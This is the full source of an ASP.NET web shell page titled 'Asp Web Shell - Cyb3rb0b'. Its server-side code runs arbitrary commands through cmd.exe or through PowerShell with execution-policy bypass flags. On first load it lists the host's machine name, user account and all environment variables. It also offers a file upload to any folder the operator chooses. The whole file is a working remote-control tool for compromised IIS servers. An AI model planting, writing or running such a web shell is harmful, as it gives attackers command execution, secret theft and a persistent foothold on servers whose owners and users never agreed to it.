<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="//netdna.bootstrapcdn.com/bootstrap/3.1.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//code.jquery.com/jquery-1.11.1.min.js"></script>

<script src="//netdna.bootstrapcdn.com/bootstrap/3.1.0/js/bootstrap.min.js"></script>

    <style>
        body {
            background-color: #fffff;
            color: #FFFFFF;
            overflow: hidden;
        }
        #txtArg{
            border:1px solid cyan;
        }
        input{
            color:black;
        }
       
    </style>
    <title>Asp Web Shell - Cyb3rb0b</title>
   
</head>
<script language="c#" runat="server">

  


    class ExecuteResult
    {
        public bool IsError { get; set; }
        public string Message { get; set; }
    }

  
    void Page_Load(object sender, EventArgs e)
    {
        this.SetFocus(this.txtArg);
        if (!IsPostBack)
        {
            this.setColor();
            string folder = Server.MapPath("~");
            StringBuilder sbl = new StringBuilder();
            sbl.Append("<table>");
            sbl.AppendFormat("<tr><td>Machine Name</td><td> {0}</td></tr>", Environment.MachineName);
            sbl.AppendLine();
            sbl.AppendFormat("<tr><td>Os Version</td><td> {0}</td></tr>", Environment.OSVersion);
            sbl.AppendLine();
            sbl.AppendFormat("<tr><td>User Domain Name</td><td> {0}</td></tr>", Environment.UserDomainName);
            sbl.AppendLine();
            sbl.AppendFormat("<tr><td>User Name</td><td> {0}</td></tr>", Environment.UserName);
            sbl.AppendLine();
            sbl.AppendFormat("<tr><td>Current Folder</td><td> {0}</td></tr></table>", folder);
            


            IDictionary environmentVariables = Environment.GetEnvironmentVariables();
            foreach (DictionaryEntry de in environmentVariables)
            {
                sbl.AppendLine();
                sbl.AppendFormat("<tr><td>{0}</td><td> {1}</td></tr></table>", de.Key, de.Value);
                Console.WriteLine("  {0} = {1}", de.Key, de.Value);
            }


            this.dvResult.InnerHtml += sbl.ToString() + "<hr/>";
        }
    }

    ExecuteResult ExcuteCmd(string arg)
    {
        ExecuteResult result = new ExecuteResult();
        ProcessStartInfo psi = new ProcessStartInfo();
        Process p = new Process();
        string error = string.Empty;
        StreamReader myStreamReader = null;
        if (this.shelloptions.SelectedValue.Equals("1"))
        {
            psi.FileName = "powershell.exe";
            psi.Arguments = "-nop -exec bypass " + arg;
        }
        else if (this.shelloptions.SelectedValue.Equals("0"))
        {
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + arg;


        }

        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        p.StartInfo = psi;
        p.Start();

        if (psi.FileName == "cmd.exe")
        {
            myStreamReader = p.StandardError;
            error = myStreamReader.ReadToEnd();

        }

        StreamReader stmrdr = p.StandardOutput;
        string s = stmrdr.ReadToEnd();
        stmrdr.Close();

        if (myStreamReader != null)
        {
            myStreamReader.Close();
        }

        if (string.IsNullOrEmpty(error))
        {
            result.IsError = false;
            result.Message = s;
        }
        else
        {
            result.IsError = true;
            result.Message = error;
        }

        return result;
    }

    void dir(string folder)
        {
        //Directory.GetFiles()
        }

    void run(string command)
    {
        ExecuteResult result = ExcuteCmd(command);
        if (!result.IsError)
        {
            this.addResult(Server.HtmlEncode(result.Message));
        }
        else
        {
            this.addResult("<div style='color:red'>" + Server.HtmlEncode(result.Message) + "</div>");
        }
    }


    void cmdExe_Click(object sender, System.EventArgs e)
    {


        if (this.txtArg.Text.ToLower().Equals("cls"))
        {
            this.dvResult.InnerHtml = string.Empty;
        }
        else
        {
            this.run(this.txtArg.Text);
        }

        this.txtArg.Text = string.Empty;

    }

    protected void uploadfile_Click(object sender, EventArgs e)
    {
        this.upload.Visible = true;
        this.uploadcmd.Enabled = true;
    }

    protected void uploadcmd_Click(object sender, EventArgs e)
    {
        try
        {
            string path = Path.Combine(this.txtTo.Text, this.file.FileName);
            this.file.SaveAs(path);
            this.addResult("<div style='color:#f1bc31'>File Uploaded to: " + path + "</div>");

        }
        catch (Exception ex)
        {
            this.addResult("<div style='color:red'>" + ex.Message + "</div>");
        }
        finally
        {
            this.upload.Visible = false;
            this.uploadcmd.Enabled = false;
        }


    }

    private void addResult(string result)
    {
        this.dvResult.InnerHtml = "<hr/><div style='color:yellow'>" + DateTime.Now.ToString("HH:MM:ss") + "</div>" + result +
            this.dvResult.InnerHtml;
    }

    protected void shelloptions_SelectedIndexChanged(object sender, EventArgs e)
    {
        this.setColor();
    }

    private void setColor()
    {
        if (this.shelloptions.SelectedValue.Equals("0"))
        {
            this.directory.Text = Environment.CurrentDirectory + ">";
            this.body.Attributes.Add("style", "background-color:#000000");
            this.txtArg.Attributes.Add("style", "background-color:#000000;width: 50%;color: #FFFF;font-weight: bold;");
        }
        else
        {
            this.directory.Text = "PS -nop -exec bypass >";
            this.body.Attributes.Add("style", "background-color:#012456");
            this.txtArg.Attributes.Add("style", "background-color:#012456;width: 50%;color: #FFFF;font-weight: bold;");

        }
    }

    
</script>
<body id="body" runat="server">


   
    <form id="cmd" method="post" runat="server">
        
        

        <div style="overflow: auto; height: 90%">
            <div id="upload" runat="server" visible="false">
                <asp:FileUpload ID="file" runat="server" />
                <asp:Label ID="lblTo" runat="server" Text="Destination Folder"></asp:Label>
                <asp:TextBox ID="txtTo" runat="server" style="color:black"></asp:TextBox>
                <asp:Button ID="uploadcmd" runat="server" Text="Upload"  style="color:black" OnClick="uploadcmd_Click" Enabled="false" />
                
            </div>
            <pre id="dvResult" style="background-color:#000000;color:#FFF"  runat="server" class="">
            </pre>
        </div>


        <div style="position: absolute; bottom: 0; width: 100%; left: 0; border: none">
            <asp:Label ID="directory" runat="server"></asp:Label>
            <asp:TextBox ID="txtArg" runat="server" Style="width: 50%; color: #FFFF; font-weight: bold;"></asp:TextBox>
            <asp:Button ID="testing" cssClass="btn btn-warning btn-sm" runat="server" Text="..." OnClick="cmdExe_Click"></asp:Button>
            <asp:Button cssClass="btn btn-success btn-sm" ID="uploadfile" runat="server" Text="Upload File" OnClick="uploadfile_Click" />
            <asp:DropDownList ID="shelloptions" runat="server" OnSelectedIndexChanged="shelloptions_SelectedIndexChanged" AutoPostBack="true" style="background-color:red">
                <asp:ListItem Text="Cmd" Value="0"></asp:ListItem>
                <asp:ListItem Text="PowerShell" Value="1"></asp:ListItem>
            </asp:DropDownList>
        </div>

    </form>
</body>
</html>

